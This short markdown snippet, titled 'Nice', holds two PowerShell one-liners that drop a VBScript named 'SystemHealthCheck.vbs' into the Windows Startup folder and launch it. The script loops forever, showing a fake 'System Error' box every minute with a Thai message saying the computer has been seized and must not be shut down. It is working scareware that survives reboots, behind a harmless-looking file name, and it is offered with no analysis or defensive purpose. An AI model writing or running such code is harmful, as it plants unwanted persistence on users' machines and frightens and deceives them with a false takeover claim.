# Nice

```bash
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemHealthCheck.vbs"; $code = 'Do : MsgBox "แฮ่! เครื่องนี้โดนยึดแล้ว ห้ามปิดนะจ๊ะ", 16, "System Error" : WScript.Sleep 60000 : Loop'; Set-Content -Path $path -Value $code; Invoke-Item $path
```

```bash
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemHealthCheck.vbs"; $code = 'Do : MsgBox "แฮ่! เครื่องนี้โดนยึดแล้ว", 16, "System Error" : WScript.Sleep 60000 : Loop'; Set-Content -Path $path -Value $code -Encoding ASCII; Start-Process wscript.exe -ArgumentList """$path"""
```
